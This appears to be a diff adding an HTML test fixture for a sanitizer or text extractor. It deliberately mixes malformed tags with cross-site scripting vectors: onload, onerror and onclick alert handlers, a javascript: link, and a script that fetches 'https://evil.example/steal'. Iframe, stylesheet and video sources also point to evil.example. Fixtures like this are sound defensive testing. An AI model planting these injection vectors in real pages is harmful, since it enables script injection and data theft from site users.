@@ -1,0 +1,11 @@
+<html><body onload="alert(1)">
+<h1>Unsafe &amp; messy</h1>
+<script>window.__pwned = true; fetch("https://evil.example/steal")</script>
+<img src="https://evil.example/pixel.png" onerror="alert(2)">
+<iframe src="https://evil.example/frame"></iframe>
+<a href="javascript:alert(3)">bad link</a>
+<p onclick="alert(4)">Visible text survives <b>unclosed bold
+<div>Another <span>nested</div> block
+<link rel="stylesheet" href="https://evil.example/x.css">
+<video src="https://evil.example/v.mp4">fallback</video>
+</body>
